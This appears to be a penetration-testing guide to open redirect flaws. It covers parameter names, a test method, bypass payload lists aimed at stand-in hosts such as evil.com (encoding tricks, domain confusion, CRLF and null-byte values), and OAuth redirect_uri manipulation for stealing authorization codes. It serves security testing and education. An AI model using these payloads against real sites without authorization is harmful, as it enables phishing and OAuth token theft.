# Open Redirect Testing Guide

> Open redirects occur when an application redirects users to a URL specified in user input without proper validation. While often considered low severity, they enable phishing attacks and can be chained with other vulnerabilities.

## Scope

- Login/logout redirect parameters
- OAuth callback URLs
- External link proxies
- URL shorteners
- File download redirects

## Methodology

1. Identify parameters that control redirects (url, redirect, next, return, goto)
2. Test with external domains
3. Try bypass techniques for validation
4. Check both client-side and server-side redirects
5. Test interaction with authentication flows

## Common Parameters

- `url`, `redirect_url`, `redirect`
- `next`, `return`, `return_url`, `returnTo`
- `goto`, `go`, `dest`, `destination`
- `redir`, `redirect_uri`, `callback`
- `path`, `continue`, `target`
- `link`, `linkurl`, `forward`

## Basic Testing

### Direct External URL
```
?redirect=https://evil.com
?next=http://attacker.site
?url=//evil.com
```

### Protocol-Relative
```
?redirect=//evil.com
?url=\/\/evil.com
```

## Bypass Techniques

### Domain Confusion
```
?url=https://evil.com/target.com
?url=https://target.com.evil.com
?url=https://evil.com?target.com
?url=https://evil.com#target.com
?url=https://target.com@evil.com
```

### URL Encoding
```
?url=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
?url=%2f%2fevil.com
?url=https:%2f%2fevil.com
```

### Double Encoding
```
?url=%252f%252fevil.com
```

### Mixed Protocols
```
?url=https:evil.com
?url=http:/\/evil.com
?url=http:///evil.com
?url=http:\\evil.com
```

### Whitespace & Special Characters
```
?url= https://evil.com
?url=https://evil.com%09
?url=https://evil.com%0d%0a
?url=https://evil.com%00
```

### Path Manipulation
```
?url=/\evil.com
?url=\/evil.com
?url=/\/evil.com/
```

### Using Valid Domain
```
?url=https://target.com/redirect?url=https://evil.com
?url=https://trusted-subdomain.target.com@evil.com
```

## JavaScript Redirects

### Location-Based
- `location.href = userInput`
- `location.assign(userInput)`
- `location.replace(userInput)`
- `window.open(userInput)`

### Meta Refresh
- User input in meta refresh content

## OAuth/SSO Context

### Redirect URI Manipulation
```
redirect_uri=https://evil.com
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com/callback/../../../evil.com
```

### State/Token Leakage
- Redirect to attacker with tokens in URL
- Fragment leakage via referrer

## Chaining with Other Vulnerabilities

### With XSS
- Redirect to URL with XSS payload
- Bypass same-origin for certain attacks

### With SSRF
- Internal redirect followed by SSRF

### With OAuth
- Steal authorization codes
- Token theft via fragment

### Phishing Enhancement
- Legitimate-looking URLs for phishing
- Trust exploitation

## Validation Requirements

1. Demonstrate redirect to external domain
2. Show the bypass technique used
3. Explain the attack scenario
4. Document impact in context

## False Positives

- Strict allowlist validation
- Relative path only redirects
- User confirmation before redirect
- No sensitive context (no auth tokens)

## Impact

- Phishing attacks with trusted domain
- OAuth token theft
- Credential harvesting
- Malware distribution
- Chain with other vulnerabilities

## Pro Tips

1. Test all redirect-like parameters
2. Check login and logout flows especially
3. Try multiple encoding variations
4. Test OAuth redirect_uri thoroughly
5. Look for JavaScript-based redirects
6. Check for header injection in redirects
7. Test mobile app deep links
8. Verify redirect validation consistency
